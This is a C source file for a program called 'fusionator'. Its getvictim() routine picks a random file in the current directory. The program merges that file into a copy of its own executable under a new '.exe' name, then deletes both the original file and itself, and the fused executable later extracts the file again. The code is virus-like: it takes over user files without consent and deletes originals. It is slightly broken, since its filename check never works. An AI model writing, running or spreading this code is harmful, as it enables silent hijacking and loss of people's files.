/* Copyright (c) 2017 Rolando González Chévere <rolosworld@gmail.com> */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

#include <sys/types.h>
#include <dirent.h>

#include <time.h>

/**
 *
 * Copy file '_in' into file '_out' in the current '_out' position
 *
 * PARAMS:
 *   FILE* _in - Opened and valid file pointer to read from
 *   FILE* _out - Opened and valid file pointer to write into
 *
 * RETURN:
 *   size_t - Total amount of bytes written
 *
 **/
size_t copyfile( FILE* _in, FILE* _out ) {
  size_t read_result;
  size_t write_result = 0;
  char buffer[255];

  do {
    read_result = fread( &buffer, sizeof(char), sizeof(buffer), _in );
    if ( read_result ) {
      write_result += fwrite( &buffer , sizeof(char), read_result, _out );
    }
  } while( read_result );

  return write_result;
}



/**
 *
 * Generate the output file name
 *
 * PARAMS:
 *   const char* _app_name - name of the current application
 *
 * RETURN:
 *   char* - Name to be used for the output file name. Notice free must
 *           be called after done using it.
 *
 **/
char* getoutputname( const char* _app_name ) {
  int str_len = strlen( _app_name ) + 5; // <fname>.exe\0
  char* output_fname = (char*) malloc( str_len * sizeof(char) );
  strcpy( output_fname, _app_name );
  strcat( output_fname, ".exe" );

  return output_fname;
}



/**
 *
 * Get the file size of the givern FILE
 *
 * PARAMS:
 *   FILE* _a_file - Opened and valid file pointer to read from
 *
 * RETURN:
 *   size_t - file size
 *
 **/
size_t getfilesize( FILE* _a_file ) {
  size_t fsize;
  fseek( _a_file , 0 , SEEK_END );
  fsize = ftell( _a_file );
  rewind( _a_file );

  return fsize;
}



/**
 *
 * Get the start position of the fusioned file
 *
 * PARAMS:
 *   FILE* _a_file - Opened and valid file pointer to read from
 *
 * RETURN:
 *   size_t - start position of the fusioned file
 *
 **/
size_t getfusionstart( FILE* _a_file ) {
  size_t fsize = getfilesize( _a_file );
  size_t start;

  char sizeof_start = sizeof(start);

  fseek( _a_file, fsize - ( 2 * sizeof_start ), SEEK_SET );
  size_t ignore = fread( &start, sizeof_start, 1, _a_file );
  rewind( _a_file );

  return start;
}



/**
 *
 * Get the end position of the fusioned file
 *
 * PARAMS:
 *   FILE* _a_file - Opened and valid file pointer to read from
 *
 * RETURN:
 *   size_t - end position of the fusioned file
 *
 **/
size_t getfusionend( FILE* _a_file ) {
  size_t fsize = getfilesize( _a_file );
  size_t end;

  char sizeof_end = sizeof(end);

  fseek( _a_file, fsize - sizeof_end, SEEK_SET );
  size_t ignore = fread( &end, sizeof_end, 1, _a_file );
  rewind( _a_file );

  return end;
}



/**
 *
 * Get the app status
 *
 * PARAMS:
 *   FILE* _a_file - app file pointer
 *
 * RETURN:
 *   unsigned char - Possible values:
 *         0: Probably not initialized
 *         1: Initialized
 *         2: Initialized and fusioned
 *
 **/
unsigned char appstatus( FILE* _a_file ) {
  size_t fsize = getfilesize( _a_file );
  size_t start = getfusionstart( _a_file );
  size_t end = getfusionend( _a_file );
  size_t end2 = fsize - sizeof(start) - sizeof(end);

  //printf("start( %ld ) end( %ld ) end2( %ld ) size( %ld ) szstart( %ld ) szend( %ld )\n", start, end, end2, fsize, sizeof(start), sizeof(end) );

  fsize = fsize - (start + end) - (sizeof(start) + sizeof(end));

  if ( start == 0 && end == end2 && fsize == 0 ) {
    // File was probably initialized
    return 1;
  }

  if ( start > 0 && end > start && end < fsize && fsize > 0 ) {
    // File was probably initialized and fusioned
    return 2;
  }

  // File probably isn't initialized
  return 0;
}



/**
 *
 * Generates an 'initialized' executable
 *
 * PARAMS:
 *   const char* _app_name - name of the current executable
 *
 * RETURN:
 *   unsigned char - status of the init
 *                   0 - not initialized
 *                   1 - initialized
 *
 */
unsigned char appinit( const char* _app_name ) {
  FILE* a_file = NULL;
  FILE* o_file = NULL;
  unsigned char status = 0;

  const char* output_fname = _app_name; //getoutputname( _app_name );
  if( !access( output_fname, F_OK ) ) {
    //printf( "File exist: %s\n", output_fname );
    goto init_cleanup;
  }

  a_file = fopen( _app_name, "rb" );
  if ( a_file == NULL ) {
    printf( "Can't open file: %s\n", _app_name );
    goto init_cleanup;
  }

  unsigned char app_status = appstatus( a_file );
  if ( app_status ) {
    printf( "App seems already initialized: %d\n", app_status );
    goto init_cleanup;
  }

  o_file = fopen( output_fname, "wb" );
  if ( o_file == NULL ) {
    printf( "Can't open file: %s\n", _app_name );
    goto init_cleanup;
  }

  size_t startfile = 0;
  size_t endfile = copyfile( a_file, o_file );
  fwrite( &startfile , sizeof(startfile), 1, o_file);
  fwrite( &endfile , sizeof(endfile), 1, o_file);

  // Set file permissions to the new file by using chmod
  if ( chmod( output_fname, S_IRUSR | S_IXUSR | S_IWUSR ) ) {
    printf( "Can't chmod error: %d\n", errno );
  }

  printf( "File initiated: %s\n", output_fname );
  status = 1;

 init_cleanup:

  if ( o_file ) {
    fclose( o_file );
  }

  if ( a_file ) {
    fclose( a_file );
  }

  //free( output_fname );

  return status;
}



/**
 *
 * Generates an 'initialized' executable
 *
 * PARAMS:
 *   FILE* _a_file - FILE pointer of the current executable
 *   FILE* _i_file - FILE pointer of the file that will be fusioned
 *   const char* _input_fname - file name of the file that will be fusioned
 *
 * RETURN:
 *   unsigned char - status of the fusion
 *                   0 - Not fusioned
 *                   1 - Fusioned
 *
 **/
unsigned char fusion( FILE* _a_file, FILE* _i_file, const char* _input_fname ) {
  FILE* o_file;
  char* output_fname = getoutputname( _input_fname );
  unsigned char status = 0;

  if( !access( output_fname, F_OK ) ) {
    printf( "File exist: %s\n", output_fname );
    goto fusion_cleanup;
  }

  o_file = fopen( output_fname, "wb" );
  if ( o_file == NULL ) {
    printf( "Can't open file: %s\n", output_fname );
    goto fusion_cleanup;
  }

  // obtain input size:
  long input_size;
  fseek( _i_file , 0 , SEEK_END );
  input_size = ftell( _i_file );
  rewind( _i_file );

  size_t afile_result = copyfile( _a_file, o_file );
  size_t ifile_result = copyfile( _i_file, o_file );
  size_t startfile = afile_result;
  size_t endfile = startfile + ifile_result;

  //printf( "START( %ld ) END( %ld )\n", startfile, endfile );
  fwrite( &startfile , sizeof(startfile), 1, o_file);
  fwrite( &endfile , sizeof(endfile), 1, o_file);

  // Set file permissions to the new file by using chmod
  if ( chmod( output_fname, S_IRUSR | S_IXUSR | S_IWUSR ) ) {
    printf( "Can't chmod error: %d\n", errno );
  }

  status = 1;

 fusion_cleanup:
  if ( o_file ) {
    fclose( o_file );
  }

  free( output_fname );

  return status;
}



/**
 *
 * Exports the fusioned file
 *
 * PARAMS:
 *   FILE* _a_file - FILE pointer of the current executable
 *   const char* _app_name - file name of the current_executable
 *
 * RETURN:
 *   void
 *
 **/
void unfusion( FILE* _a_file, char* _app_name ) {
  size_t fsize = getfilesize( _a_file );
  size_t start = getfusionstart( _a_file );
  size_t end = getfusionend( _a_file );
  size_t read_result;
  size_t write_result = 0;
  register int i = 0;
  char buffer;
  FILE* o_file = NULL;
  FILE* a_file2 = NULL;

  unsigned char delete_app = 0;
  const char app_name[15] = "fusionator.exe";

  int str_len = strlen( _app_name );
  if ( str_len < 5 ) {
    printf( "Invalid file name: %s\n", _app_name );
    goto unfusion_cleanup;
  }

  if ( _app_name[str_len - 4] != '.' &&
       _app_name[str_len - 3] != 'e' &&
       _app_name[str_len - 2] != 'x' &&
       _app_name[str_len - 1] != 'e' ) {
    printf( "Invalid file name: %s\n", _app_name );
    goto unfusion_cleanup;
  }

  int cut_pos = str_len - 4;

  char tmp_char = _app_name[cut_pos];
  _app_name[cut_pos] = '\0';

  if( !access( _app_name, F_OK ) ) {
    printf( "File exist: %s\n", _app_name );
    goto unfusion_cleanup;
  }

  if( !access( app_name, F_OK ) ) {
    printf( "File exist: %s\n", app_name );
    goto unfusion_cleanup;
  }

  o_file = fopen( _app_name, "wb" );
  if ( o_file == NULL ) {
    printf( "Can't open file: %s\n", _app_name );
    goto unfusion_cleanup;
  }

  a_file2 = fopen( app_name, "wb" );
  if ( a_file2 == NULL ) {
    printf( "Can't open file: %s\n", app_name );
    goto unfusion_cleanup;
  }

  //fseek( _a_file, start, SEEK_SET );
  for( i = 0; i < end; i++ ) {
    read_result = fread( &buffer, sizeof(char), 1, _a_file );
    if ( read_result ) {
      if ( i < start ) {
        write_result += fwrite( &buffer , sizeof(char), read_result, a_file2 );
      }
      else {
        write_result += fwrite( &buffer , sizeof(char), read_result, o_file );
      }
    }
  }

  // Set file permissions to the new file by using chmod
  if ( chmod( app_name, S_IRUSR | S_IXUSR | S_IWUSR ) ) {
    printf( "Can't chmod error: %d\n", errno );
  }

  delete_app = 1;
  _app_name[cut_pos] = tmp_char;

 unfusion_cleanup:
  if ( o_file ) {
    fclose( o_file );
  }

  if ( a_file2 ) {
    fclose( a_file2 );
  }

  if ( delete_app ) {
    unlink( _app_name );
  }

}



/**
 *
 * Returns a random filename of the current path
 *
 * PARAMS:
 *   const char* _app_name - file name of the current_executable. Used to skip this filename
 *
 * RETURN:
 *   char* - pointer to the file name string. Needs to call free on it after done using it.
 *
 **/
char* getvictim( const char* app_name ) {
  DIR* dir;
  struct dirent *dp;
  char* file_name = NULL;
  dir = opendir(".");

  int count = 0;

  while( ( dp = readdir( dir ) ) != NULL ) {

    if( !strcmp( dp->d_name, "."  )     ||
        !strcmp( dp->d_name, ".." )     ||
        !strcmp( dp->d_name, app_name ) ||
        strlen( dp->d_name ) > 255 ) {
      continue;
    }
    else {
      count++;
    }
  }

  rewinddir( dir );

  srand(time(NULL));
  int r = rand() % count;
  int str_len = 0;

  while( ( dp = readdir( dir ) ) != NULL ) {
    str_len = strlen( dp->d_name );

    if( !strcmp( dp->d_name, "."  )     ||
        !strcmp( dp->d_name, ".." )     ||
        !strcmp( dp->d_name, app_name ) ||
        str_len > 255 ) {
      continue;
    }
    else {
      if ( !r-- ) {
        file_name = (char*) malloc( (str_len+1) * sizeof(char) );
        strcpy( file_name, dp->d_name );
        break;
      }
    }
  }

  closedir(dir);

  return file_name;
}


/**
 *
 * Main function
 *
 * If the executable is a fusioned one it'll try to export the file.
 *
 * ARGUMENTS:
 *   -i - generates the initialized executable
 *   -p - encrypts the file to be fusioned
 *
 **/
int main( int _argc, char **_argv ) {
  char* app_name = _argv[0];
  FILE* p_file = NULL;
  FILE* a_file = NULL;
  char* fname = 0;

  // Process arguments
  char *pvalue = NULL;
  int index;
  int p;

  unsigned char delete_me = 0;
  unsigned char delete_him = 0;

  opterr = 0;

  while( ( p = getopt( _argc, _argv, "ip:" ) ) != -1 )
    switch( p )
      {
      case 'p':
        pvalue = optarg;
        break;
      case '?':
        if( optopt == 'p')
          fprintf( stderr, "Option -%c requires an argument.\n", optopt );
        else if( isprint( optopt ) )
          fprintf( stderr, "Unknown option `-%c'.\n", optopt );
        else
          fprintf( stderr,
                   "Unknown option character `\\x%x'.\n",
                   optopt );
        return 1;
      default:
        abort();
      }

  //if( optind < _argc ) {
  //  fname = _argv[optind];
  //}
  fname = getvictim( app_name );

  a_file = fopen( app_name, "rb" );
  if ( a_file == NULL ) {
    printf( "Can't open file: %s\n", app_name );
    goto main_cleanup;
  }

  unsigned char app_status = appstatus( a_file );
  if ( app_status == 2 ) {
    printf( "UnfuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuSION\n" );
    unfusion( a_file, app_name );
    goto main_cleanup;
  }

  if ( app_status == 0 ) {
    //printf( "Need to initialize fusionator.\n" );
    delete_me = appinit( app_name );
    //goto main_cleanup;
  }

  // If we reach this we need to fusion
  if ( !fname ) {
    printf( "No filename given\n" );
    goto main_cleanup;
  }

  p_file = fopen( fname, "rb" );
  if ( p_file == NULL ) {
    printf( "Can't open file: %s\n", fname );
    goto main_cleanup;
  }

  printf( "FUUUuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuSION\n" );
  delete_me = fusion( a_file, p_file, fname );
  delete_him = delete_me;

 main_cleanup:
  if ( p_file ) {
    fclose( p_file );
  }

  if ( a_file ) {
    fclose( a_file );
  }

  if ( delete_me ) {
    unlink( app_name );
  }

  if ( delete_him ) {
    unlink( fname );
  }

  if ( fname ) {
    free( fname );
  }

  return 0;
}
